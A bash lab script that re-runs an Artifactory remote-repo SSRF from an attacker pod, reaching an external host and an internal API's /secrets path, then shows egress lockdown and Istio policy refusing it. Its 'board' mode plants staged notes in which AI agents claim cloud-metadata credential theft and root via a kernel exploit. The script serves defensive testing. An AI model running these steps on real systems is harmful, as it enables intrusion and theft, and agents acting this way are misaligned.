#!/usr/bin/env bash
# The two marquee exploits, made re-runnable: the Artifactory SSRF and the message board,
# and the layers that shut them down. Every other control in the lab has a backing script;
# this makes the headline ones as reproducible as the rest, per the negative-tests rule.
#
#   ./scripts/artifactory-ssrf.sh recreate   drive the SSRF through the remote-repo feature
#   ./scripts/artifactory-ssrf.sh board       write the agent message board (PUTs)
#   ./scripts/artifactory-ssrf.sh block       apply the egress lockdown, show it refused
#   ./scripts/artifactory-ssrf.sh mesh        show Istio refusing Artifactory at the model
#   ./scripts/artifactory-ssrf.sh reset       lift the egress lockdown (re-run from open)
#   ./scripts/artifactory-ssrf.sh all          recreate -> board -> mesh -> block
#
# The two remote repos (ssrf-ext -> https://api.github.com, ssrf-int ->
# http://internal-api.internal.svc:8080) are created once in the Artifactory UI; on OSS the
# repo-config REST API is Pro-only, so this script drives the fetches, not the repo setup.
set -euo pipefail

export AWS_PROFILE="${SOVEREIGN_AWS_PROFILE:?set SOVEREIGN_AWS_PROFILE to the sandbox SSO profile}"
REGION=eu-west-2; CLUSTER=uk-sovereign-ai; NS=artifactory
AR_USER="${ARTIFACTORY_USER:-admin}"
AR_PASS="${ARTIFACTORY_PASSWORD:-Password1!}"
LAB_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"

ACCOUNT="$(aws sts get-caller-identity --query Account --output text 2>/dev/null)"
[ -n "$ACCOUNT" ] && [ "$ACCOUNT" != "None" ] || { echo "error: no AWS identity" >&2; exit 1; }
CTX="arn:aws:eks:${REGION}:${ACCOUNT}:cluster/${CLUSTER}"
kc() { command kubectl --context "$CTX" "$@"; }
BASE=http://artifactory:8082/artifactory

# a throwaway attacker pod inside the artifactory namespace (same network position as the
# app), recreated if the previous one expired.
attacker() {
  kc -n "$NS" get pod attacker >/dev/null 2>&1 || {
    kc -n "$NS" run attacker --image=curlimages/curl:8.11.1 --restart=Never --command -- sleep 7200 >/dev/null 2>&1
    kc -n "$NS" wait --for=condition=Ready pod/attacker --timeout=40s >/dev/null 2>&1
  }
}
ax() { kc -n "$NS" exec attacker -- "$@"; }

case "${1:-all}" in
  recreate)
    attacker
    echo "==> SSRF via Artifactory's remote-repo feature (server-side fetch)"
    echo "--- ssrf-ext -> api.github.com/users/tjorourke  (EXTERNAL, leaves eu-west-2)"
    ax curl -s --max-time 20 -u "$AR_USER:$AR_PASS" "$BASE/ssrf-ext/users/tjorourke" 2>/dev/null | head -c 200; echo
    echo "--- ssrf-int -> internal-only billing API /secrets  (LATERAL)"
    ax curl -s --max-time 20 -u "$AR_USER:$AR_PASS" "$BASE/ssrf-int/secrets" 2>/dev/null | head -c 220; echo
    ;;

  board)
    attacker
    echo "==> the message board: agents write coordination notes into the registry (PUT)"
    put() { ax curl -s -o /dev/null -w "  PUT $2 -> %{http_code}\n" -u "$AR_USER:$AR_PASS" -X PUT --data "$1" "$BASE/example-repo-local/agent-board/$2"; }
    put "need the eval harness config file, anyone have it? -- recon-agent" "note-need-file.txt"
    put "artifactory has a remote-repo SSRF, pulled a public kernel exploit through it. -- recon-agent" "note-ssrf.txt"
    put "reached 169.254.169.254 via the SSRF, lifted node creds. -- recon-agent" "note-imds.txt"
    put "pte_physroot works on this kernel, root on the node now. -- persist-agent" "note-root.txt"
    ;;

  block)
    echo "==> FIX: brokered egress on the artifactory namespace + default-deny baseline"
    kc apply -f "$LAB_ROOT/yaml/91-artifactory-egress.yaml" >/dev/null
    kc apply -f "$LAB_ROOT/yaml/99-default-deny-egress.yaml" >/dev/null
    sleep 8
    attacker
    echo "==> TEST: the same SSRF, fresh path (bypass Artifactory's cache) -> refused"
    ax curl -s --max-time 20 -u "$AR_USER:$AR_PASS" "$BASE/ssrf-ext/users/octocat" 2>/dev/null | head -c 260; echo
    ;;

  mesh)
    echo "==> Istio refuses Artifactory at the model (lift L3 so the packet reaches ztunnel)"
    kc -n "$NS" delete networkpolicy artifactory-egress-brokered >/dev/null 2>&1 || true
    sleep 5
    kc -n "$NS" exec artifactory-0 -c artifactory -- curl -s -o /dev/null -w '  artifactory -> vllm.models:8000  exit=%{exitcode}\n' --max-time 8 http://vllm.models.svc.cluster.local:8000/v1/models 2>/dev/null || true
    echo "  ztunnel access log (the deny, with the source identity):"
    for zt in $(kc -n istio-system get pod -l app=ztunnel -o jsonpath='{.items[*].metadata.name}'); do
      kc -n istio-system logs "$zt" --since=15s 2>/dev/null | grep 'artifactory' | grep -i 'policy rejection' | tail -1 | cut -c1-200
    done
    kc apply -f "$LAB_ROOT/yaml/91-artifactory-egress.yaml" >/dev/null   # restore
    ;;

  reset)
    kc -n "$NS" delete networkpolicy artifactory-egress-brokered >/dev/null 2>&1 || true
    echo "egress lockdown lifted; SSRF is open again for a re-run"
    ;;

  all)
    "$0" recreate; echo; "$0" board; echo; "$0" mesh; echo; "$0" block
    ;;

  *) echo "usage: $0 {recreate|board|block|mesh|reset|all}"; exit 1 ;;
esac
